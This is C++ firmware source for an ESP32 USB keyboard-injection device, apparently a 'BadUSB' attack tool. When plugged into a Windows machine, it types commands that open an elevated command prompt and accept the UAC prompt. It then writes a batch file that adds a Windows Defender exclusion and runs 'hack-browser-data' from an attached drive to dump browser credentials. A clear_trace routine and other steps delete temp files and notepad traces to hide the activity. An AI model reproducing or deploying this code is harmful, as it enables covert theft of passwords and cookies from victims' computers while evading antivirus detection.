#include "exescript.h"
USBHIDKeyboard Keyboard;
TaskParameters task_params(" ", 5, 0);
SemaphoreHandle_t task_params_mutex;

// Initialize USB connection
void setup_usb()
{
    USB.begin();
    Keyboard.begin();
    delay(500);
    task_params_mutex = xSemaphoreCreateMutex();
}

// Actual Task Function
void write_task_wrapper(void *parameters)
{
    const TickType_t delay_ms = pdMS_TO_TICKS(100); // Adjust the delay as needed
    while (true)
    {
        // Acquire mutex to access task_params
        if (xSemaphoreTake(task_params_mutex, portMAX_DELAY) == pdTRUE)
        {
            vTaskResume(xTaskGetHandle("blink_rgb"));
            vTaskDelay(pdMS_TO_TICKS(10));
            write(task_params.str, task_params.del, task_params.e);
            vTaskSuspend(xTaskGetHandle("blink_rgb"));
            neopixelWrite(21, 0, 0, 0);
            vTaskDelay(pdMS_TO_TICKS(10));
            xSemaphoreGive(task_params_mutex); // Release mutex
        }
        vTaskDelay(delay_ms); // Add a small delay to avoid tight loop
        vTaskSuspend(NULL);   // Suspend the task after execution
    }
}

TaskHandle_t write_task_handle = NULL;

// Initialise the Writing Task
void create_write_task()
{
    xTaskCreatePinnedToCore(
        write_task_wrapper,
        "write_task_name",
        12000,
        nullptr,
        2,
        &write_task_handle, // Task handle
        1                   // Pinned to Core 1
    );
}

void write_task(const char *str, const int del, int e)
{
    // Update global task_params variable
    uint64_t start = esp_timer_get_time();
    if (xSemaphoreTake(task_params_mutex, portMAX_DELAY) == pdTRUE)
    {
        task_params.str = str;
        task_params.del = del;
        task_params.e = e;
        xSemaphoreGive(task_params_mutex);
    }

    // Resume Task if handle is available
    if (write_task_handle != NULL)
    {
        vTaskResume(write_task_handle);
    }
}

// Count string length
int count_len(const char *str)
{
    int len = 0;
    while (*str != '\0')
    {
        len++;
        str++;
    }
    return len;
}

void write(const char *str, const int del, int e)
{
    int len = count_len(str);
    for (int i = 0; i < len; i++)
    {
        Keyboard.write(str[i]);
        vTaskDelay(pdMS_TO_TICKS(del)); // Adjust the delay as needed
    }
    if (e != 0)
    { // If e = 1 (Press ENTER = True)
        Keyboard.write(KEY_RETURN);
    }
}

// Remove traces from 'C:\Windows\Temp\'
void clear_trace()
{
    delay(100);
    write("CD ..", 5, 1);
    write(R"(powershell -Command "Remove-Item 'C:/Windows/Temp/temp*' -Recurse -Force")", 5, 1);
    delay(2000);
    write("exit", 5, 1);
}

// Press WIN+R, open cmd, say hello world
void open_elevated_cmd()
{
    Keyboard.pressRaw(0xE3); // WINDOWS KEY
    Keyboard.pressRaw(0x15); // R KEY
    Keyboard.releaseAll();
    delay(1000);
    write(R"(powershell -command "Start-Process cmd.exe -Verb RunAs")", 30, 1);
    delay(2000);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_LEFT_ARROW);
    delay(1000);
    Keyboard.write(KEY_RETURN);
    delay(1000);
}

// Open Elevated Command Prompt, create a batch file
// Note - This code adds the filename to exception of Windows Defender List
void payload()
{
    open_elevated_cmd();
    write("CD /d C:/Windows/Temp", 10, 1);
    write("mkdir temp", 10, 1);
    write("cd temp", 10, 1);
    write("rem/ > execute.bat", 10, 1);
    write("notepad execute.bat", 10, 1);
    Keyboard.releaseAll();
    delay(2000);
    const char data[] = R"(@echo off
setlocal enabledelayedexpansion
TIMEOUT /t 10 /nobreak
powershell -Command Add-MpPreference -ExclusionPath "D:\hack-browser-data-windows-64bit.exe"
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        if exist "%%d:\find_temp_check.txt" (
            echo "find_temp_check.txt" found in %%d:\
	    cd /d "%%d:\"
            hack-browser-data-windows-64bit.exe  
        ) 
    )
)
powershell -Command "Remove-Item 'C:/Windows/Temp/temp*' -Recurse -Force
TIMEOUT /t 5 /nobreak
exit
)";
    delay(50);
    write_task(data, 15, 0);
    // Wait until write_task completes
    while (true)
    {
        if (xSemaphoreTake(task_params_mutex, portMAX_DELAY) == pdTRUE)
        {
            xSemaphoreGive(task_params_mutex);
            break;
        }
    }
    delay(1000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.write('s'); // save the file
    Keyboard.release('s');
    Keyboard.press('w'); // remove notepad traces
    Keyboard.releaseAll();
    delay(500);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.write(KEY_RETURN);
    delay(1000);
}
